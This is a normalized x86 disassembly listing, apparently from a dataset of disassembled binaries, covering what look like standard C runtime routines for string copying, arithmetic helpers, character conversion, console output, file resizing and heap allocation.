push [ esi + 0x88 ]
call sub_200368f
push [ esi + 0x8c ]
call sub_200368f
push [ esi + 0x90 ]
call sub_200368f
push [ esi + 0x94 ]
call sub_200368f
push [ esi + 0x98 ]
call sub_200368f
push [ esi + 0x9c ]
call sub_200368f
push [ esi + 0xa0 ]
call sub_200368f
push [ esi + 0xa4 ]
call sub_200368f
push [ esi + 0xa8 ]
call sub_200368f
add esp 0x2c
sub_200d72c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_200368f
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_200368f
pop ecx
push esi
call sub_200368f
pop ecx
sub_200d771
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_200368f
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_200368f
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_200368f
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_200368f
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_200368f
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_200368f
pop ecx
push esi
call sub_200368f
pop ecx
sub_200d7ff
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_2005621
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_2005621
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_2006be9
add esp 0x14
mov eax esi
jmp r-xdata
sub_200d880
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_200d8c6
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_2005621
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_2005621
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_2006be9
add esp 0x14
mov eax esi
jmp r-xdata
sub_200d97b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_2005621
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_2005621
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_2006be9
add esp 0x14
mov eax esi
jmp r-xdata
sub_200d9f0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_200da30
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_2004235
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_200da7b
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_2004235
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_200da30
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_200d555
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_200db33
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_2005621
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_2005621
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_2006be9
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_200db97
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_2004235
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_2005621
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_2006be9
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_2005621
mov [ eax ] 0x2a
call sub_2005621
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_2005621
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_2006be9
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_20039e0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_20039e0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_200dd20
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_200ddb5
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_200851f
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_2008528
pop ecx
test eax eax
je r-xdata
push eax
call sub_2008528
pop ecx
test eax eax
je r-xdata
push eax
call sub_2008528
push [ rw-data ]
mov esi eax
call sub_2008528
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_20084ad
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_20084ad
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_20084ad
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_20084ad
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_20084ad
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_2008528
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_200df1e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_2005621
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_200df70
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_200dfa4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_2004235
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_200e00f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_200e9fc
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_2003680
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_200e0d4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_2004235
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_200da30
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_2005621
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_200e210
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_200e23b
push 0x10
push r--data
call sub_2006310
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_2005621
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_2006be9
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_2005816
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_2005849
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_2006355
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200e2d5
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_200e2e7
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_200b7cc
test eax eax
je r-xdata
push 0xa
call sub_2009971
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_200b7d9
pop ecx
push 0x3
call sub_2005457
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_20039e0
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_200e3fe
push 0xc
push r--data
call sub_2006310
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_2005621
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_2006be9
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_2006355
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_2009b64
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_2005816
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_2006028
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200e4fa
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_20039e0
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_200e51c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_200ca14
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_2005621
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_200ca14
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_200ca14
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200ca14
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_200e6d2
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_2005621
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_200ccb9
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_2005621
mov [ eax ] 0xd
call sub_2005634
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_2005634
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_2005621
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_200a8dd
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_200e6d2
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_200e6d2
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov eax [ edx ]
and esi 0x1f
shl esi 0x6
lea ecx [ eax + esi ]
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_200e78e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_2005621
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_200e7c7
mov edi edi
push ebp
mov ebp esp
